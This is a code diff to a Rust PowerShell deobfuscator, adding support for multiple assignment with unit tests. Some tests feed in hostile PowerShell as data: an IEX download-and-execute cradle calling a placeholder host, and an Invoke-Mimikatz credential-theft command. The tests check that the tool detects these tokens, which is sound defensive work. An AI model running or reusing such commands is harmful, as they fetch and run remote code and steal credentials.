@@ -2578,6 +2578,14 @@ impl<'a> PowerShellSession {
         let token = pairs.next().unwrap();
 
         match token.as_rule() {
+            Rule::assignment_exp
+                if token
+                    .clone()
+                    .into_inner()
+                    .any(|p| p.as_rule() == Rule::multiple_assignment_exp) =>
+            {
+                self.eval_multiple_assigment_exp(token)
+            }
             Rule::assignment_exp => self.eval_assigment_exp(token),
             Rule::pipeline_with_tail => self.eval_pipeline_with_tail(token),
             _ => unexpected_token!(token),
@@ -2672,6 +2680,97 @@ impl<'a> PowerShellSession {
         self.add_deobfuscated_statement(format!("{} = {}", var_name, variable.cast_to_script()));
 
         Ok(Val::NonDisplayed(Box::new(variable)))
+    }
+
+    // $a, $b = 1, 2, 3: each target takes one element, the last one takes the rest
+    fn eval_multiple_assigment_exp(&mut self, token: Pair<'a>) -> ParserResult<Val> {
+        check_rule!(token, Rule::assignment_exp);
+
+        let mut specified_type = None;
+        let mut type_text = "";
+        let mut targets = vec![];
+        let mut right_token = None;
+        let pairs = token.into_inner().flat_map(|pair| match pair.as_rule() {
+            Rule::multiple_assignment_exp => pair.into_inner().collect(),
+            _ => vec![pair],
+        });
+        for pair in pairs {
+            match pair.as_rule() {
+                Rule::type_literal => {
+                    type_text = pair.as_str();
+                    specified_type = Some(self.eval_type_literal(pair)?);
+                }
+                Rule::assignable_variable => targets.push(pair),
+                Rule::assign_op => {}
+                _ => right_token = Some(pair),
+            }
+        }
+        let Some(right_token) = right_token else {
+            return Err(ParserError::NotImplemented("multiple assignment".into()));
+        };
+        let right_op = self.eval_statement(right_token)?;
+
+        let text = targets
+            .iter()
+            .map(|t| t.as_str())
+            .collect::<Vec<_>>()
+            .join(", ");
+        self.add_deobfuscated_statement(format!(
+            "{}{} = {}",
+            type_text,
+            text,
+            right_op.cast_to_script()
+        ));
+
+        // a chained assignment ($a, $b = $c = 1, 2) gives its value wrapped
+        let values = match right_op.clone() {
+            Val::NonDisplayed(value) => *value,
+            value => value,
+        };
+        let mut values = match values {
+            Val::Array(values) => values,
+            value => vec![value],
+        }
+        .into_iter();
+        let last = targets.len().saturating_sub(1);
+        for (i, target) in targets.into_iter().enumerate() {
+            let value = if i < last {
+                values.next().unwrap_or_default()
+            } else {
+                let mut rest = values.by_ref().collect::<Vec<_>>();
+                match rest.len() {
+                    0 | 1 => rest.pop().unwrap_or_default(),
+                    _ => Val::Array(rest),
+                }
+            };
+            // a cast applies to the first target only
+            let value = match specified_type.as_ref().filter(|_| i == 0) {
+                Some(runtime_type) => value.cast(runtime_type).map_err(ParserError::from),
+                None => Ok(value),
+            };
+            // an unresolved target is not assigned, the other ones still are
+            if let Err(err) = value.and_then(|value| self.assign_target(target, value)) {
+                self.errors.push(err);
+            }
+        }
+
+        Ok(Val::NonDisplayed(Box::new(right_op)))
+    }
+
+    fn assign_target(&mut self, target: Pair<'a>, value: Val) -> ParserResult<()> {
+        let (var_name, access) = self.parse_assignable_variable(target)?;
+        let mut variable = self
+            .variables
+            .get(&var_name, &self.types_map)
+            .unwrap_or_default();
+        let mut accessed_elem = &mut variable;
+        if let Some(access) = access {
+            for token in access {
+                accessed_elem = self.variable_access(token, accessed_elem)?;
+            }
+        }
+        *accessed_elem = value;
+        Ok(self.variables.set(&var_name, variable)?)
     }
 
     fn push_scope_session(&mut self) {
@@ -3035,6 +3134,114 @@ $ilryNQSTt="System.$([cHAR]([ByTE]0x4d)+[ChAR]([byte]0x61)+[chAr](110)+[cHar]([b
                 "{}: {:?}",
                 &script[..60],
                 start.elapsed()
+            );
+        }
+    }
+
+    #[test]
+    fn multiple_assignment() {
+        let mut ps = PowerShellSession::new();
+        for (script, expected) in [
+            ("$a, $b = 1, 2, 3; \"$a|$b|$($b[1])\"", "1|2 3|3"),
+            ("$a, $b = 1, 2; \"$a|$b\"", "1|2"),
+            ("$a, $b = 1; \"$a|$($null -eq $b)\"", "1|True"),
+            ("$a, $b = 1, 2; $a, $b = $b, $a; \"$a|$b\"", "2|1"),
+            ("$a, $b, $c = \"x y z\".Split(\" \"); \"$c$b$a\"", "zyx"),
+            ("$h = @{ k = 'p', 'q' }; $a, $b = $h[\"k\"]; \"$b$a\"", "qp"),
+            (
+                "$o = @{ p = 0 }; $arr = @(0, 0); $o.p, $arr[1], $env:mx = 'x', 'y', 'z'; \
+                 \"$($o.p)$($arr[1])$env:mx\"",
+                "xyz",
+            ),
+            ("[int]$a, $b = '1', '2'; \"$($a + 1)|$($b + 1)\"", "2|21"),
+            ("$a, $b = $c = 1, 2; \"$a|$b|$($c[1])\"", "1|2|2"),
+        ] {
+            let res = ps.parse_script(script).unwrap();
+            assert_eq!(
+                res.result().to_string(),
+                expected,
+                "{script}: {:?}",
+                res.errors()
+            );
+        }
+        let res = ps.parse_script("$a, $b = 1, 2").unwrap();
+        assert_eq!(res.deobfuscated(), "$a, $b = @(1,2)");
+        // the first target is not parsed again, which would be exponential in nesting
+        let nested = format!("{}$a{}", "(".repeat(8), "), $b = 1".repeat(8));
+        assert!(parse_program(&nested).is_ok());
+    }
+
+    #[test]
+    fn multiple_assignment_in_foreach() {
+        // foreach bodies are not evaluated, only their tokens are collected
+        let script = r#"
+$cases = [ordered]@{ one = @('m1', 'YQ=='); two = @('m2', 'Yg==') }
+foreach ($k in $cases.Keys) {
+    $mode, $b64 = $cases[$k]
+    Invoke-Mimikatz $mode
+}
+'next'"#;
+        let res = PowerShellSession::new().parse_script(script).unwrap();
+        assert_eq!(res.result().to_string(), "next", "{:?}", res.errors());
+        let found = res
+            .tokens()
+            .methods_and_commands()
+            .contains("Invoke-Mimikatz");
+        assert!(found, "{:?}", res.errors());
+
+        let script = r#"
+$cases = @{ one = @('m1', 'YQ==') }
+'one' | % { $mode, $b64 = $cases[$_]; $mode + $b64 }"#;
+        let res = PowerShellSession::new().parse_script(script).unwrap();
+        assert_eq!(res.result().to_string(), "m1YQ==", "{:?}", res.errors());
+    }
+
+    #[test]
+    fn multiple_assignment_unresolved_rhs_keeps_tokens() {
+        let res = PowerShellSession::new()
+            .parse_script("$a, $b = IEX (New-Object Net.WebClient).DownloadString('http://x'); $a")
+            .unwrap();
+        let tokens = res.tokens();
+        assert!(
+            tokens
+                .methods_and_commands()
+                .iter()
+                .any(|f| f.eq_ignore_ascii_case("iex"))
+        );
+        assert!(tokens.lowercased_string_set().contains("http://x"));
+
+        let res = PowerShellSession::new()
+            .parse_script("$a, $b = $undefined; [Console]::Title, $c = 'x', 'y'; \"$a|$c\"")
+            .unwrap();
+        assert_eq!(res.result().to_string(), "$a|y", "{:?}", res.errors());
+        assert!(
+            res.errors().contains(&ParserError::Skip),
+            "{:?}",
+            res.errors()
+        );
+        // the same as an unresolved single assignment
+        let res = PowerShellSession::new()
+            .parse_script("$a = $undefined; \"$a\"")
+            .unwrap();
+        assert_eq!(res.result().to_string(), "$a", "{:?}", res.errors());
+    }
+
+    #[test]
+    fn comma_without_assignment_is_unchanged() {
+        let mut ps = PowerShellSession::new();
+        for (script, expected) in [
+            ("$x = 1, 2; $x[1]", "2"),
+            ("$a = 1; $b = 2; ($a, $b)[1]", "2"),
+            ("$a = 1; $b = 2; $a, $b", "1\n2"),
+            ("Write-Output 1, 2", "1 , 2"),
+            ("$x = 5; $x += 1; $x", "6"),
+        ] {
+            let res = ps.parse_script(script).unwrap();
+            assert_eq!(
+                res.result().to_string(),
+                expected,
+                "{script}: {:?}",
+                res.errors()
             );
         }
     }
